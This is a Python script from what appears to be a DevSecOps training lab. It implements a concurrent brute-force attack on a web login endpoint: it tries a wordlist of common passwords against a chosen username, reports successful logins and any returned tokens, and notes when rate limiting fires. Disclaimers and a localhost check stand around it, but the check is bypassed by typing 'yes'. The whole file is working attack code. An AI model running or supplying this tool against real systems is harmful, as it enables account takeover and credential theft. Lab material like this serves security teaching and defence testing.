#!/usr/bin/env python3
"""
DevSecOps Hacking Lab - Brute Force Attack Script
Educational tool for demonstrating password brute-force attacks

WARNING: Only use this against systems you own or have explicit permission to test!
"""

import argparse
import asyncio
import time
from typing import List, Dict, Optional
from datetime import datetime
import json
import sys
from pathlib import Path

import httpx
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
from rich.panel import Panel
from rich import print as rprint

console = Console()


class BruteForceAttacker:
    """Brute force attack orchestrator"""
    
    def __init__(
        self,
        target_url: str,
        username: str,
        wordlist: List[str],
        delay: float = 0.1,
        max_concurrent: int = 5,
        timeout: float = 10.0
    ):
        self.target_url = target_url
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        
        self.results: Dict = {
            "successful": [],
            "failed": [],
            "rate_limited": [],
            "errors": []
        }
        
        self.start_time = None
        self.end_time = None
        
    async def attempt_login(self, password: str, client: httpx.AsyncClient) -> Dict:
        """Attempt a single login"""
        try:
            response = await client.post(
                self.target_url,
                json={
                    "username": self.username,
                    "password": password
                },
                timeout=self.timeout
            )
            
            return {
                "password": password,
                "status_code": response.status_code,
                "success": response.status_code == 200,
                "response": response.json() if response.status_code == 200 else None,
                "rate_limited": response.status_code == 429,
                "banned": response.status_code == 403,
                "timestamp": datetime.utcnow().isoformat()
            }
            
        except httpx.TimeoutException:
            return {
                "password": password,
                "error": "Timeout",
                "timestamp": datetime.utcnow().isoformat()
            }
        except Exception as e:
            return {
                "password": password,
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat()
            }
    
    async def run_attack(self):
        """Execute the brute force attack"""
        self.start_time = time.time()
        
        console.print("\n[bold red]⚔️  Starting Brute Force Attack[/bold red]\n")
        console.print(f"[yellow]Target:[/yellow] {self.target_url}")
        console.print(f"[yellow]Username:[/yellow] {self.username}")
        console.print(f"[yellow]Passwords to try:[/yellow] {len(self.wordlist)}")
        console.print(f"[yellow]Delay:[/yellow] {self.delay}s")
        console.print(f"[yellow]Max concurrent:[/yellow] {self.max_concurrent}\n")
        
        # Create semaphore for rate limiting
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async with httpx.AsyncClient() as client:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                
                task = progress.add_task(
                    "[cyan]Testing passwords...",
                    total=len(self.wordlist)
                )
                
                async def attempt_with_semaphore(password: str):
                    async with semaphore:
                        result = await self.attempt_login(password, client)
                        await asyncio.sleep(self.delay)  # Rate limiting delay
                        progress.advance(task)
                        return result
                
                # Execute all attempts
                results = await asyncio.gather(
                    *[attempt_with_semaphore(pwd) for pwd in self.wordlist]
                )
                
                # Categorize results
                for result in results:
                    if "error" in result:
                        self.results["errors"].append(result)
                    elif result.get("success"):
                        self.results["successful"].append(result)
                    elif result.get("rate_limited") or result.get("banned"):
                        self.results["rate_limited"].append(result)
                    else:
                        self.results["failed"].append(result)
        
        self.end_time = time.time()
        self.display_results()
    
    def display_results(self):
        """Display attack results"""
        duration = self.end_time - self.start_time
        
        console.print("\n[bold green]✅ Attack Completed[/bold green]\n")
        
        # Summary table
        table = Table(title="Attack Summary", show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Duration", f"{duration:.2f} seconds")
        table.add_row("Total Attempts", str(len(self.wordlist)))
        table.add_row("Successful", f"[green]{len(self.results['successful'])}[/green]")
        table.add_row("Failed", f"[red]{len(self.results['failed'])}[/red]")
        table.add_row("Rate Limited/Banned", f"[yellow]{len(self.results['rate_limited'])}[/yellow]")
        table.add_row("Errors", f"[red]{len(self.results['errors'])}[/red]")
        table.add_row("Requests per second", f"{len(self.wordlist) / duration:.2f}")
        
        console.print(table)
        
        # Successful logins
        if self.results["successful"]:
            console.print("\n[bold green]🎯 Successful Logins:[/bold green]")
            for result in self.results["successful"]:
                console.print(f"  ✓ Password: [green]{result['password']}[/green]")
                if result.get("response"):
                    console.print(f"    Token: {result['response'].get('token', 'N/A')}")
        
        # Rate limiting detection
        if self.results["rate_limited"]:
            console.print(f"\n[bold yellow]⚠️  Rate Limiting Detected:[/bold yellow]")
            console.print(f"  {len(self.results['rate_limited'])} requests were blocked")
            console.print("  [dim]Defense mechanism is active![/dim]")
        
        # Save detailed results
        self.save_results()
    
    def save_results(self):
        """Save results to JSON file"""
        output_dir = Path(__file__).parent / "results"
        output_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        output_file = output_dir / f"brute_force_{timestamp}.json"
        
        report = {
            "attack_info": {
                "target": self.target_url,
                "username": self.username,
                "timestamp": datetime.utcnow().isoformat(),
                "duration": self.end_time - self.start_time,
                "total_attempts": len(self.wordlist)
            },
            "summary": {
                "successful": len(self.results["successful"]),
                "failed": len(self.results["failed"]),
                "rate_limited": len(self.results["rate_limited"]),
                "errors": len(self.results["errors"])
            },
            "results": self.results
        }
        
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2)
        
        console.print(f"\n[dim]Results saved to: {output_file}[/dim]")


def load_wordlist(wordlist_path: Optional[str] = None) -> List[str]:
    """Load password wordlist"""
    if wordlist_path:
        try:
            with open(wordlist_path, "r") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            console.print(f"[red]Error: Wordlist file not found: {wordlist_path}[/red]")
            sys.exit(1)
    else:
        # Default common passwords for testing
        return [
            "admin",
            "password",
            "123456",
            "admin123",
            "password123",
            "test",
            "test123",
            "demo",
            "demo123",
            "root",
            "toor",
            "qwerty",
            "letmein",
            "welcome",
            "monkey",
            "dragon",
            "master",
            "sunshine",
            "princess",
            "football"
        ]


def validate_target(target_url: str) -> bool:
    """Validate that target is localhost or explicitly allowed"""
    allowed_hosts = ["localhost", "127.0.0.1", "0.0.0.0"]
    
    for host in allowed_hosts:
        if host in target_url:
            return True
    
    console.print("\n[bold red]⚠️  SECURITY WARNING[/bold red]")
    console.print(f"[yellow]Target '{target_url}' is not localhost![/yellow]")
    console.print("\n[red]This tool should ONLY be used against systems you own![/red]")
    console.print("[red]Unauthorized access to computer systems is illegal.[/red]\n")
    
    response = console.input("[yellow]Are you AUTHORIZED to test this target? (yes/no): [/yellow]")
    return response.lower() == "yes"


async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Brute Force Attack Tool - Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python brute_force.py --target http://localhost:8000/login --username admin
  python brute_force.py --target http://localhost:8000/login --username admin --wordlist passwords.txt --delay 0.5

WARNING: Only use this tool against systems you own or have explicit permission to test!
        """
    )
    
    parser.add_argument(
        "--target",
        required=True,
        help="Target login URL (e.g., http://localhost:8000/login)"
    )
    
    parser.add_argument(
        "--username",
        required=True,
        help="Username to test"
    )
    
    parser.add_argument(
        "--wordlist",
        help="Path to password wordlist file"
    )
    
    parser.add_argument(
        "--delay",
        type=float,
        default=0.1,
        help="Delay between requests in seconds (default: 0.1)"
    )
    
    parser.add_argument(
        "--max-concurrent",
        type=int,
        default=5,
        help="Maximum concurrent requests (default: 5)"
    )
    
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # Display disclaimer
    console.print(Panel.fit(
        "[bold red]ETHICAL HACKING DISCLAIMER[/bold red]\n\n"
        "This tool is for educational and authorized testing purposes only.\n"
        "Unauthorized access to computer systems is illegal and unethical.\n\n"
        "[yellow]By continuing, you confirm that you have permission to test the target system.[/yellow]",
        border_style="red"
    ))
    
    # Validate target
    if not validate_target(args.target):
        console.print("\n[red]Attack aborted. Authorization not confirmed.[/red]")
        sys.exit(1)
    
    # Load wordlist
    wordlist = load_wordlist(args.wordlist)
    console.print(f"\n[green]Loaded {len(wordlist)} passwords from wordlist[/green]")
    
    # Create attacker
    attacker = BruteForceAttacker(
        target_url=args.target,
        username=args.username,
        wordlist=wordlist,
        delay=args.delay,
        max_concurrent=args.max_concurrent,
        timeout=args.timeout
    )
    
    # Run attack
    await attacker.run_attack()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n\n[yellow]Attack interrupted by user[/yellow]")
        sys.exit(0)




